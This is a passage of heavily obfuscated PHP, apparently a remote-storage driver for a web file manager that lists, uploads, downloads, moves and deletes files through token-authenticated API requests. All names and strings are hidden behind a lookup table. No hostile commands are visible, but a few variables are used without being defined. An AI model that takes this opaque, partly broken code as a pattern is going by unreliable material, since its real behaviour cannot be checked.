(!$åÔÑä) { return !1; } $ƒ¦¤ã¥« = array($ºÅÏË¤[1556] => $åÔÑä[$ºÅÏË¤[1554]], $ºÅÏË¤[1557] => $åÔÑä[$ºÅÏË¤[1554]], $ºÅÏË¤[1381] => $åÔÑä[$ºÅÏË¤[1554]], $ºÅÏË¤[107] => $åÔÑä[$ºÅÏË¤[1555]], $ºÅÏË¤[1558] => $åÔÑä[$ºÅÏË¤[1555]], $ºÅÏË¤[1330] => $åÔÑä[$ºÅÏË¤[1555]], $ºÅÏË¤[1559] => !1, $ºÅÏË¤[429] => !1, $ºÅÏË¤[1560] => !1, $ºÅÏË¤[1561] => !1); return $ƒ¦¤ã¥«[$¸ß¼ı‹Ò]; } public function listPath($ÀËÒğ—†, $¶‘Îì÷’ = false) { return $this->request($_SERVER[œ—üé‹ê][1562], array($ÀËÒğ—†)); } public function setContent($˜­®á¼Ç, $ƒÓŒŞ = '') { return $this->request($_SERVER[œ—üé‹ê][1563], array($˜­®á¼Ç, $ƒÓŒŞ)); } public function getContent($½¼°ÏÎ›) { return $this->_fileSubstr($½¼°ÏÎ›); } public function fileSubstr($’‰ú»–, $º’°¬†·, $Ûğ›”¶) { return $this->_fileSubstr($’‰ú»–, $º’°¬†·, $Ûğ›”¶); } public function download($Ø’„Õ¿», $Î‰ĞÓ÷Ç) { return $this->_download($Ø’„Õ¿», $Î‰ĞÓ÷Ç); } public function isFileOutServer() { return !1; } public function fileOut($íÍ¬µ, $¨ÅêûØ… = false, $ÓùÚÀÉş = false, $ßášÔ = '') { $©áÜ¯Ò =& $_SERVER[œ—üé‹ê]; $this->fileOutLink($this->_fileLink($íÍ¬µ, ($ßášÔ ? $©áÜ¯Ò[1564] . $ßášÔ : $©áÜ¯Ò[12]) . ($¨ÅêûØ… ? $©áÜ¯Ò[1565] : $©áÜ¯Ò[12]))); } public function fileOutImage($€ÓíÃ…, $®à½’á§ = 250) { $this->fileOutLink($this->_fileLink($€ÓíÃ…, $_SERVER[œ—üé‹ê][1566] . $®à½’á§)); } public function fileOutLink($ÎÉíÜµ) { header($_SERVER[œ—üé‹ê][172] . $this->urlAuto($ÎÉíÜµ)); die; } public function exist($´µˆ×Ù’) { $Éú—†Î² = $this->_info($´µˆ×Ù’); return $Éú—†Î² ? !0 : !1; } public function isFile($Åƒ°‹±’) { $¸€Şò—¯ =& $_SERVER[œ—üé‹ê]; $…ø‡¼ÊÑ = $this->_info($Åƒ°‹±’); return _get($…ø‡¼ÊÑ, $¸€Şò—¯[33], $¸€Şò—¯[12]) == $¸€Şò—¯[230]; } public function isFolder($¤°„³”Û) { $Ü§ìóÉŒ =& $_SERVER[œ—üé‹ê]; $Àš•ëÂ¤ = $this->_info($¤°„³”Û); return _get($Àš•ëÂ¤, $Ü§ìóÉŒ[33], $Ü§ìóÉŒ[12]) == $Ü§ìóÉŒ[78]; } public function size($’æª“Œë) { $‚Û §¼¡ = $this->_info($’æª“Œë); return _get($‚Û §¼¡, $_SERVER[œ—üé‹ê][79], 0); } public function info($ÛÖÁèàğ) { return $this->_info($ÛÖÁèàğ); } public function infoAuth($Õíğ»ìã) { return $this->_info($Õíğ»ìã); } public function infoFull($¸…É•”Ô) { return $this->_info($¸…É•”Ô); } public function infoFullSimple($ñ•Ğåş) { return $this->_info($ñ•Ğåş); } public function infoWithChildren($ŸÔ¤ù”ğ) { return $this->_info($ŸÔ¤ù”ğ, !0); } public function has($Ã«–Á´Ä, $‹ô¿ªŸÅ = false, $’–Ò¯¼ = false) { $’ì¡Éà½ =& $_SERVER[œ—üé‹ê]; $‹Çâóšà = $this->_info($Ã«–Á´Ä); if (!$‹Çâóšà) { return !1; } if ($‹ô¿ªŸÅ) { return array($’ì¡Éà½[239] => $‹Çâóšà[$’ì¡Éà½[239]], $’ì¡Éà½[240] => $‹Çâóšà[$’ì¡Éà½[240]]); } return $¯éÏ­›æ ? $‹Çâóšà[$’ì¡Éà½[239]] > 0 : $‹Çâóšà[$’ì¡Éà½[240]] > 0; } public function mkfile($Î—ø¨™, $ûä¢‹Ç = '', $À„şœ‘¼ = REPEAT_RENAME) { return $this->request($_SERVER[œ—üé‹ê][1539], array($Î—ø¨™, $ûä¢‹Ç, $À„şœ‘¼)); } public function mkdir($àÜ–˜ç½, $›ëÅ’İ× = REPEAT_SKIP) { return $this->request($_SERVER[œ—üé‹ê][1540], array($àÜ–˜ç½, $›ëÅ’İ×)); } public function remove($Ãò¦³•½) { return $this->request($_SERVER[œ—üé‹ê][1330], array($Ãò¦³•½)); } public function rename($„ÉÙÜ£, $Ü—±ï•ö) { return $this->request($_SERVER[œ—üé‹ê][1543], array($„ÉÙÜ£, $Ü—±ï•ö)); } public function moveSameAllow() { } public function copy($‡œÉûÅ”, $ëê”ÛÜ’, $¢ş÷²˜÷ = REPEAT_REPLACE, $œÃ‰ğß = false) { return $this->request($_SERVER[œ—üé‹ê][641], array($‡œÉûÅ”, $ëê”ÛÜ’, $¢ş÷²˜÷)); } public function move($²°Çîèò, $ÓÄñÒ£, $¥é¼Å¿³ = REPEAT_REPLACE, $µ…ÒÒ = false) { return $this->request($_SERVER[œ—üé‹ê][643], array($²°Çîèò, $ÓÄñÒ£, $¥é¼Å¿³)); } public function uploadLink($è¨ª·÷½, $µµùÕ€ = 0) { $¨¿ã™›Ø =& $_SERVER[œ—üé‹ê]; $óâí€¸â = IO::init($GLOBALS[$¨¿ã™›Ø[7]][$¨¿ã™›Ø[87]]); $ù ²úæÒ = $this->pathApiEncode($óâí€¸â->path); $Æä„ú³† = $this->requestMakeUrl($¨¿ã™›Ø[1567], array($¨¿ã™›Ø[87] => $ù ²úæÒ)); return array($¨¿ã™›Ø[1568] => $Æä„ú³†); } public function upload($İ¹éåêÆ, $‹ËÈç, $ÌÁõÄé¼ = false, $¸†ı”ßõ = REPEAT_REPLACE) { $¡Ñš£ÌÄ =& $_SERVER[œ—üé‹ê]; if (filesize($‹ËÈç) < $this->uploadChunkSize) { return $this->request($¡Ñš£ÌÄ[107], array($İ¹éåêÆ, $‹ËÈç, $¸†ı”ßõ)); } $üáÙã¢¿ = $this->uploadHashCheck($İ¹éåêÆ, $‹ËÈç, $¸†ı”ßõ); if ($üáÙã¢¿) { return $üáÙã¢¿; } $îĞÇ»§ç = @filesize($‹ËÈç); $­€•Ñ° = $this->uploadChunkSize; $â’š©£¯ = ceil($îĞÇ»§ç / $­€•Ñ°); $ôòÕçÆé = 0; while ($ôòÕçÆé < $â’š©£¯) { $ò‡š·ıï = IO::fileSubstr($‹ËÈç, $ôòÕçÆé * $­€•Ñ°, $­€•Ñ°); $æ´ãıÈŸ = $this->tempFile($¡Ñš£ÌÄ[12], $ò‡š·ıï); $å» ”ÉÎ = array($¡Ñš£ÌÄ[79] => $îĞÇ»§ç, $¡Ñš£ÌÄ[1569] => $­€•Ñ°, $¡Ñš£ÌÄ[1570] => $â’š©£¯, $¡Ñš£ÌÄ[1571] => $ôòÕçÆé); $¨Òó› = $this->uploadSend($İ¹éåêÆ, $æ´ãıÈŸ, $å» ”ÉÎ, $¸†ı”ßõ); $ôòÕçÆé++; if (!$¨Òó›) { return !1; } } if (!is_array($¨Òó›) || empty($¨Òó›[$¡Ñš£ÌÄ[595]])) { return !1; } return $this->pathApiDecode($¨Òó›[$¡Ñš£ÌÄ[595]]); } private function uploadHashCheck($¯ñ¬²×ã, $»«ƒ¦Ó, $Ù…åñ†Ç) { $öëªÁ• =& $_SERVER[œ—üé‹ê]; $çŸµµıÀ = IO::hashSimple($»«ƒ¦Ó); $äÎ¯İ» = array($öëªÁ•[1572] => $öëªÁ•[1573], $öëªÁ•[1532] => $çŸµµıÀ); $’”ÇáŞ† = $this->uploadSend($¯ñ¬²×ã, $öëªÁ•[12], $äÎ¯İ», $Ù…åñ†Ç); $Üğ¨…ÈË = _get($’”ÇáŞ†, $öëªÁ•[595], array()); $„‹ áŠƒ = _get($Üğ¨…ÈË, $öëªÁ•[1574]); if (!is_array($„‹ áŠƒ) || !$„‹ áŠƒ[$öëªÁ•[563]]) { return !1; } $Ä‡Œ¶åÑ = IO::hashMd5($»«ƒ¦Ó); if ($„‹ áŠƒ[$öëªÁ•[563]] != $Ä‡Œ¶åÑ) { return !1; } if ($’”ÇáŞ†[$öëªÁ•[595]][$öëªÁ•[1575]]) { $this->uploadChunkSize = $’”ÇáŞ†[$öëªÁ•[595]][$öëªÁ•[1575]]; } $äÎ¯İ» = array($öëªÁ•[1572] => $öëªÁ•[1576], $öëªÁ•[1533] => $Ä‡Œ¶åÑ, $öëªÁ•[1532] => $çŸµµıÀ); $’”ÇáŞ† = $this->uploadSend($¯ñ¬²×ã, $öëªÁ•[12], $äÎ¯İ», $Ù…åñ†Ç); if (!is_array($’”ÇáŞ†) || empty($’”ÇáŞ†[$öëªÁ•[595]])) { return !1; } return $this->pathApiDecode($’”ÇáŞ†[$öëªÁ•[595]]); } private function uploadSend($ÈÄúşßÓ, $‰şÃäé©, $É¦ÏÄš, $Ÿä¯æ°Ÿ = '') { $é‹Ç«Ì” =& $_SERVER[œ—üé‹ê]; $É¦ÏÄš[$é‹Ç«Ì”[32]] = get_path_this($ÈÄúşßÓ); $É¦ÏÄš[$é‹Ç«Ì”[87]] = $this->pathApiEncode(get_path_father($ÈÄúşßÓ)); if ($Ÿä¯æ°Ÿ) { $É¦ÏÄš[$é‹Ç«Ì”[1577]] = $Ÿä¯æ°Ÿ; } if ($‰şÃäé©) { $É¦ÏÄš[$é‹Ç«Ì”[230]] = $é‹Ç«Ì”[1394] . $‰şÃäé©; } return $this->requestSend($é‹Ç«Ì”[1567], $É¦ÏÄš); } protected function pathApiEncode($‚Ö¿´Ãı) { $ò‰ÁÉ·ß =& $_SERVER[œ—üé‹ê]; $ÖÓÕÚ«‚ = $this->_config[$ò‰ÁÉ·ß[1550]]; $¼¤ô•š— = strlen($ÖÓÕÚ«‚); if (substr($‚Ö¿´Ãı, 0, $¼¤ô•š—) == $ÖÓÕÚ«‚) { return $‚Ö¿´Ãı; } return $ÖÓÕÚ«‚ . ltrim($‚Ö¿´Ãı, $ò‰ÁÉ·ß[8]); } protected function pathApiDecode($ŸÙäûã) { $ÛßÆ©ıú =& $_SERVER[œ—üé‹ê]; $¢æÈÏÓ = $this->_config[$ÛßÆ©ıú[1550]]; $ôìÅñã‰ = strlen($¢æÈÏÓ); if (substr($ŸÙäûã, 0, $ôìÅñã‰) !== $¢æÈÏÓ) { return $ŸÙäûã; } return $this->_config[$ÛßÆ©ıú[1353]] . ltrim(substr($ŸÙäûã, $ôìÅñã‰), $ÛßÆ©ıú[8]); } private function pathInfoParse(&$€çÌ²±) { $®›‹úÁÉ =& $_SERVER[œ—üé‹ê]; $ö¦êŞ›Â = $this->_config; $¶è¬±š = $ö¦êŞ›Â[$®›‹úÁÉ[576]]; if (!$€çÌ²± || !is_array($€çÌ²±)) { return $€çÌ²±; } static $òü—§ƒÒ = array(); $Úš‡ı½§ = $òü—§ƒÒ[$¶è¬±š[$®›‹úÁÉ[687]]]; if (!is_array($Úš‡ı½§)) { $Ü ¥œµİ = LNG($®›‹úÁÉ[1578]); $ªåÑ¾òå = $ö¦êŞ›Â[$®›‹úÁÉ[580]][$®›‹úÁÉ[90]]; $•ìçÃöŒ = parse_url($ö¦êŞ›Â[$®›‹úÁÉ[580]][$®›‹úÁÉ[1579]]); $Ô¼êŒï = $ö¦êŞ›Â[$®›‹úÁÉ[580]][$®›‹úÁÉ[1580]]; $Úš‡ı½§ = array($®›‹úÁÉ[1581] => $ªåÑ¾òå[$®›‹úÁÉ[32]] . $®›‹úÁÉ[1067] . $Ô¼êŒï . $®›‹úÁÉ[1394] . $•ìçÃöŒ[$®›‹úÁÉ[206]] . $®›‹úÁÉ[1069], $®›‹úÁÉ[1582] => $Ü ¥œµİ . $®›‹úÁÉ[1133] . $ö¦êŞ›Â[$®›‹úÁÉ[580]][$®›‹úÁÉ[1579]] . $®›‹úÁÉ[1583] . LNG($®›‹úÁÉ[1584]) . $®›‹úÁÉ[1133] . $Ô¼êŒï, $®›‹úÁÉ[1585] => LNG($®›‹úÁÉ[1586]) . $®›‹úÁÉ[1587] . $ö¦êŞ›Â[$®›‹úÁÉ[580]][$®›‹úÁÉ[1579]] . $®›‹úÁÉ[285] . LNG($®›‹úÁÉ[1588]) . $®›‹úÁÉ[1587] . $ªåÑ¾òå[$®›‹úÁÉ[602]], $®›‹úÁÉ[1580] => array($®›‹úÁÉ[32] => $Ô¼êŒï, $®›‹úÁÉ[1589] => $®›‹úÁÉ[1590]), $®›‹úÁÉ[1591] => Action($®›‹úÁÉ[1537])->shareTargetMake($¶è¬±š[$®›‹úÁÉ[1547]])); $òü—§ƒÒ[$¶è¬±š[$®›‹úÁÉ[687]]] = $Úš‡ı½§; } unset($€çÌ²±[$®›‹úÁÉ[191]]); unset($€çÌ²±[$®›‹úÁÉ[604]]); unset($€çÌ²±[$®›‹úÁÉ[188]]); unset($€çÌ²±[$®›‹úÁÉ[589]]); $€çÌ²±[$®›‹úÁÉ[1592]] = !0; $€çÌ²±[$®›‹úÁÉ[232]] = $ö¦êŞ›Â[$®›‹úÁÉ[1554]]; $€çÌ²±[$®›‹úÁÉ[233]] = $ö¦êŞ›Â[$®›‹úÁÉ[1555]]; $€çÌ²±[$®›‹úÁÉ[502]] = $ö¦êŞ›Â[$®›‹úÁÉ[1552]]; $€çÌ²±[$®›‹úÁÉ[1580]] = $Úš‡ı½§[$®›‹úÁÉ[1580]]; $€çÌ²±[$®›‹úÁÉ[1593]] = $¶è¬±š[$®›‹úÁÉ[231]]; $€çÌ²±[$®›‹úÁÉ[1594]] = $¶è¬±š[$®›‹úÁÉ[88]]; $€çÌ²±[$®›‹úÁÉ[1595]] = $Úš‡ı½§[$®›‹úÁÉ[1585]]; $€çÌ²±[$®›‹úÁÉ[1591]] = $Úš‡ı½§[$®›‹úÁÉ[1591]]; $€çÌ²±[$®›‹úÁÉ[687]] = $¶è¬±š[$®›‹úÁÉ[687]]; $Ï¶²Íßˆ = explode($®›‹úÁÉ[8], trim($€çÌ²±[$®›‹úÁÉ[602]], $®›‹úÁÉ[8])); $Ï¶²Íßˆ[0] = $Úš‡ı½§[$®›‹úÁÉ[1581]]; $€çÌ²±[$®›‹úÁÉ[602]] = implode($®›‹úÁÉ[8], $Ï¶²Íßˆ); if (count($Ï¶²Íßˆ) > 1) { unset($€çÌ²±[$®›‹úÁÉ[1591]]); } if (count($Ï¶²Íßˆ) == 1) { if ($€çÌ²±[$®›‹úÁÉ[33]] == $®›‹úÁÉ[78]) { $€çÌ²±[$®›‹úÁÉ[32]] = $Úš‡ı½§[$®›‹úÁÉ[1581]]; } array_set_value($€çÌ²±, $®›‹úÁÉ[1596], $Úš‡ı½§[$®›‹úÁÉ[1582]]); } $µıı×¦ = array($®›‹úÁÉ[1597], $®›‹úÁÉ[1516], $®›‹úÁÉ[1598], $®›‹úÁÉ[1599]); foreach ($µıı×¦ as $×•Şçóá) { $À—œ¡Ó¢ = $this->urlAuto(_get($€çÌ²±, $×•Şçóá, $®›‹úÁÉ[12])); if ($À—œ¡Ó¢) { array_set_value($€çÌ²±, $×•Şçóá, $À—œ¡Ó¢); } } } private function _info($•¸´°§ê, $º‹ßÃù¿ = false) { $è²Ş½å– =& $_SERVER[œ—üé‹ê]; $¯÷ñı§´ = $this->_config; if (!$¯÷ñı§´) { return !1; } static $ÜˆÆÃ©Å = array(); if (isset($ÜˆÆÃ©Å[$•¸´°§ê]) && is_array($ÜˆÆÃ©Å[$•¸´°§ê])) { return $ÜˆÆÃ©Å[$•¸´°§ê]; } if ((!$•¸´°§ê || !trim($•¸´°§ê, $è²Ş½å–[8])) && !$º‹ßÃù¿) { $ÊÈŞÄµ = $¯÷ñı§´[$è²Ş½å–[580]][$è²Ş½å–[90]]; if (!$ÊÈŞÄµ) { return !1; } $ÊÈŞÄµ[$è²Ş½å–[602]] = $è²Ş½å–[12]; $ÊÈŞÄµ[$è²Ş½å–[87]] = $¯÷ñı§´[$è²Ş½å–[1353]]; $this->pathInfoParse($ÊÈŞÄµ); return $ÊÈŞÄµ; } $ôÀò‡Äò = $this->request($è²Ş½å–[1600], array($•¸´°§ê, $º‹ßÃù¿)); $ÜˆÆÃ©Å[$•¸´°§ê] = $ôÀò‡Äò; return $ôÀò‡Äò; } private function _fileSubstr($›²Ô«´È, $ÜƒÃ€ù± = 0, $®Î¥ÀŒ‹ = -1) { $é©²¡´ =& $_SERVER[œ—üé‹ê]; $õ“¼ƒÇÎ = $this->_fileLink($›²Ô«´È); if (!$õ“¼ƒÇÎ) { return !1; } $ˆıÑş¹Î = !1; if ($®Î¥ÀŒ‹ > 0) { $ÓõØèş¦ = $ÎöŒû¾¾ + $®Î¥ÀŒ‹ - 1; $ˆıÑş¹Î = array($é©²¡´[1601] . $ÎöŒû¾¾ . $é©²¡´[476] . $ÓõØèş¦); } $¢°İµÆÊ = url_request($õ“¼ƒÇÎ, $é©²¡´[1602], !1, $ˆıÑş¹Î); return $¢°İµÆÊ[$é©²¡´[859]] ? $¢°İµÆÊ[$é©²¡´[1388]] : !1; } private function _download($şÚÀ¤ò, $®‘¥Ù³À) { $ŸœİÖ÷ª = $this->_fileLink($şÚÀ¤ò); if (!$ŸœİÖ÷ª) { return !1; } Downloader::start($ŸœİÖ÷ª, $®‘¥Ù³À); return $®‘¥Ù³À; } private function _fileLink($Šºå×ÔŒ, $ÑğŸ²²ü = '') { $—ïğÈœÛ =& $_SERVER[œ—üé‹ê]; $²ÙîÄÖÌ = $this->pathApiEncode($Šºå×ÔŒ); return $this->requestMakeUrl($—ïğÈœÛ[1603], array($—ïğÈœÛ[87] => $²ÙîÄÖÌ)) . $ÑğŸ²²ü; } private function urlAuto($¸œíƒÏ) { $¢ òû• =& $_SERVER[œ—üé‹ê]; if (!$¸œíƒÏ) { return $¸œíƒÏ; } $¨’Şéãø = parse_url($¸œíƒÏ); $”Àâ÷öõ = $¸œíƒÏ; if ($this->_config[$¢ òû•[1553]] && $¨’Şéãø[$¢ òû•[205]] == $¢ òû•[149] && Input::check($¨’Şéãø[$¢ òû•[1604]], $¢ òû•[1605])) { $¸œíƒÏ = $¢ òû•[217] . substr($¸œíƒÏ, 7); } $ÔÂÛÇ©ä = $¢ òû•[1606] . rawurlencode(rtrim($this->config[$¢ òû•[1550]], $¢ òû•[8])); if (strstr($¸œíƒÏ, $ÔÂÛÇ©ä)) { $âë×‡±¤ = strstr($¸œíƒÏ, $¢ òû•[76]) ? $¢ òû•[284] : $¢ òû•[76]; $¸œíƒÏ = $¸œíƒÏ . $âë×‡±¤ . $¢ òû•[1607] . $this->authToken; } return $¸œíƒÏ; } private function request($”‘ô…¿Ÿ, $ŠÜéòû´) { $ƒõ¡ˆˆ  =& $_SERVER[œ—üé‹ê]; if (!is_array($ŠÜéòû´)) { $ŠÜéòû´ = array(); } for ($ŠŒ§¦’À = 0; $ŠŒ§¦’À < 4; $ŠŒ§¦’À++) { if (!isset($ŠÜéòû´[$ŠŒ§¦’À])) { $ŠÜéòû´[$ŠŒ§¦’À] = $ƒõ¡ˆˆ [12]; } } $²Øç¡ÓÎ = array($ƒõ¡ˆˆ [1600] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1600], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [1610], $ƒõ¡ˆˆ [1611] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [1612] => array(array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0])), $ƒõ¡ˆˆ [1613] => $ŠÜéòû´[1] ? $ƒõ¡ˆˆ [91] : $ƒõ¡ˆˆ [12])), $ƒõ¡ˆˆ [1562] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1614], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1611] => $ƒõ¡ˆˆ [1615], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0], $ƒõ¡ˆˆ [428] => _get($GLOBALS[$ƒõ¡ˆˆ [7]], $ƒõ¡ˆˆ [428], $ƒõ¡ˆˆ [91]), $ƒõ¡ˆˆ [439] => _get($GLOBALS[$ƒõ¡ˆˆ [7]], $ƒõ¡ˆˆ [439], $ƒõ¡ˆˆ [1616]))), $ƒõ¡ˆˆ [1617] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1618], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1611] => $ƒõ¡ˆˆ [1619], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0])), $ƒõ¡ˆˆ [1563] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1620], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [1622], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0], $ƒõ¡ˆˆ [168] => $ŠÜéòû´[1])), $ƒõ¡ˆˆ [1539] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1539], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [595], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0], $ƒõ¡ˆˆ [168] => $ŠÜéòû´[1], $ƒõ¡ˆˆ [1577] => $ŠÜéòû´[2])), $ƒõ¡ˆˆ [1540] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1540], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [595], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0], $ƒõ¡ˆˆ [1577] => $ŠÜéòû´[2])), $ƒõ¡ˆˆ [641] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1623], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [1624], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [1625], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [1612] => array(array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0])), $ƒõ¡ˆˆ [87] => $ŠÜéòû´[1], $ƒõ¡ˆˆ [1577] => $ŠÜéòû´[2])), $ƒõ¡ˆˆ [643] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1626], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [1624], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [1625], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [1612] => array(array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0])), $ƒõ¡ˆˆ [87] => $ŠÜéòû´[1], $ƒõ¡ˆˆ [1577] => $ŠÜéòû´[2])), $ƒõ¡ˆˆ [1330] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1627], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [1610], $ƒõ¡ˆˆ [1611] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [1612] => array(array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0])))), $ƒõ¡ˆˆ [1543] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1628], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [595], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => $ŠÜéòû´[0], $ƒõ¡ˆˆ [1629] => $ŠÜéòû´[1])), $ƒõ¡ˆˆ [107] => array($ƒõ¡ˆˆ [1608] => $ƒõ¡ˆˆ [1567], $ƒõ¡ˆˆ [1609] => $ƒõ¡ˆˆ [87], $ƒõ¡ˆˆ [1621] => $ƒõ¡ˆˆ [595], $ƒõ¡ˆˆ [1352] => array($ƒõ¡ˆˆ [87] => get_path_father($ŠÜéòû´[0]), $ƒõ¡ˆˆ [230] => $ŠÜéòû´[1] ? $ƒõ¡ˆˆ [1394] . $ŠÜéòû´[1] : $ƒõ¡ˆˆ [12], $ƒõ¡ˆˆ [32] => get_path_this($ŠÜéòû´[0]), $ƒõ¡ˆˆ [1577] => $ŠÜéòû´[2]))); $ğÍñ¨á = $²Øç¡ÓÎ[$”‘ô…¿Ÿ]; if (!$ğÍñ¨á) { return !1; } $³Û‘‹ì = $ğÍñ¨á[$ƒõ¡ˆˆ [1352]]; $úïíñ¸Ò = explode($ƒõ¡ˆˆ [50], $ğÍñ¨á[$ƒõ¡ˆˆ [1609]]); foreach ($úïíñ¸Ò as $İ¶âğ·Ç) { $¿‘ó•î¢ = $this->pathApiEncode(_get($³Û‘‹ì, $İ¶âğ·Ç)); array_set_value($³Û‘‹ì, $İ¶âğ·Ç, $¿‘ó•î¢); } if ($”‘ô…¿Ÿ == $ƒõ¡ˆˆ [1543] && trim($ğÍñ¨á[$ƒõ¡ˆˆ [1352]][$ƒõ¡ˆˆ [87]], $ƒõ¡ˆˆ [8]) == trim($this->_config[$ƒõ¡ˆˆ [1353]], $ƒõ¡ˆˆ [8])) { return $ğÍñ¨á[$ƒõ¡ˆˆ [1352]][$ƒõ¡ˆˆ [87]]; } $…–±É™Û = $this->requestSend($ğÍñ¨á[$ƒõ¡ˆˆ [1608]], $³Û‘‹ì); if (!$…–±É™Û) { return !1; } $ÀóÈù÷Û = $…–±É™Û[$ƒõ¡ˆˆ [1388]]; if ($ğÍñ¨á[$ƒõ¡ˆˆ [1621]]) { $ÀóÈù÷Û = _get($…–±É™Û, $ğÍñ¨á[$ƒõ¡ˆˆ [1621]]); } if (is_string($ÀóÈù÷Û) && !$ğÍñ¨á[$ƒõ¡ˆˆ [1611]]) { return $this->pathApiDecode($ÀóÈù÷Û); } if (!is_array($ÀóÈù÷Û) || !$ÀóÈù÷Û) { return $ÀóÈù÷Û; } $ûÑ êíü = explode($ƒõ¡ˆˆ [50], $ğÍñ¨á[$ƒõ¡ˆˆ [1611]]); foreach ($ûÑ êíü as $İ¶âğ·Ç) { $ Î™üòâ = explode($ƒõ¡ˆˆ [10], $İ¶âğ·Ç); $î»ößì = array_search($ƒõ¡ˆˆ [1630], $ Î™üòâ); if ($î»ößì === !1) { $¿‘ó•î¢ = $this->pathApiDecode(_get($ÀóÈù÷Û, $İ¶âğ·Ç)); array_set_value($ÀóÈù÷Û, $İ¶âğ·Ç, $¿‘ó•î¢); if ($”‘ô…¿Ÿ == $ƒõ¡ˆˆ [1600] && $İ¶âğ·Ç == $ƒõ¡ˆˆ [87]) { $this->pathInfoParse($ÀóÈù÷Û); } if ($”‘ô…¿Ÿ == $ƒõ¡ˆˆ [1562] && $İ¶âğ·Ç == $ƒõ¡ˆˆ [1631]) { $this->pathInfoParse($ÀóÈù÷Û[$ƒõ¡ˆˆ [977]]); } if ($”‘ô…¿Ÿ == $ƒõ¡ˆˆ [1562]) { $ÀóÈù÷Û[$ƒõ¡ˆˆ [1632]] = array(); } continue; } $©“–³¼™ = implode($ƒõ¡ˆˆ [10], array_slice($ Î™üòâ, $î»ößì + 1)); $ñò¶éøï = array(); if ($î»ößì === 0) { $ñò¶éøï =& $ÀóÈù÷Û; } if ($î»ößì === 1) { $ñò¶éøï =& $ÀóÈù÷Û[$ Î™üòâ[0]]; } if ($î»ößì === 2) { $ñò¶éøï =& $ÀóÈù÷Û[$ Î™üòâ[0]][$ Î™üòâ[1]]; } foreach ($ñò¶éøï as $İ¶âğ·Ç => $çíºêÖ) { $¿‘ó•î¢ = $this->pathApiDecode(_get($çíºêÖ, $©“–³¼™)); array_set_value($ñò¶éøï[$İ¶âğ·Ç], $©“–³¼™, $¿‘ó•î¢); $this->pathInfoParse($ñò¶éøï[$İ¶âğ·Ç]); } unset($ñò¶éøï); } return $ÀóÈù÷Û; } private function requestMakeUrl($ËÇšŠœ¼, $–£ïÓÎæ = '') { $ØªÔ•¤« =& $_SERVER[œ—üé‹ê]; $“€œ¢İô = $this->_config; if (!$this->authToken) { return !1; } $¸Å”Õ¬¬ = $this->requestQuery($–£ïÓÎæ, !0) . $ØªÔ•¤«[1633] . $this->authToken; $Òù»¶¶Ô = rtrim($“€œ¢İô[$ØªÔ•¤«[580]][$ØªÔ•¤«[1579]], $ØªÔ•¤«[8]) . $ØªÔ•¤«[1634] . $ËÇšŠœ¼; return $Òù»¶¶Ô . $ØªÔ•¤«[1635] . rawurlencode($“€œ¢İô[$ØªÔ•¤«[580]][$ØªÔ•¤«[1551]]) . $¸Å”Õ¬¬; } private function requestAuthToken() { $œŒÑææŠ =& $_SERVER[œ—üé‹ê]; $†ÛØñ‘ = $this->_config; if (!$†ÛØñ‘) { return !1; } $Óˆ†Ö€Å = _get($†ÛØñ‘, $œŒÑææŠ[1636]); $Ô«íû² = array_find_by_field($†ÛØñ‘[$œŒÑææŠ[580]][$œŒÑææŠ[1591]], $œŒÑææŠ[1637], $Óˆ†Ö€Å); if (!$Ô«íû²) { return !1; } $íµÀ°ÌÇ = $Ô«íû²[$œŒÑææŠ[1638]] . $œŒÑææŠ[1639] . $Ô«íû²[$œŒÑææŠ[1343]]; $Ñ±û“Ç = $œŒÑææŠ[1640] . $this->pathParse[$œŒÑææŠ[487]] . $œŒÑææŠ[476] . $íµÀ°ÌÇ; $ü­ÀÑ‘¦ = Cache::get($Ñ±û“Ç); if 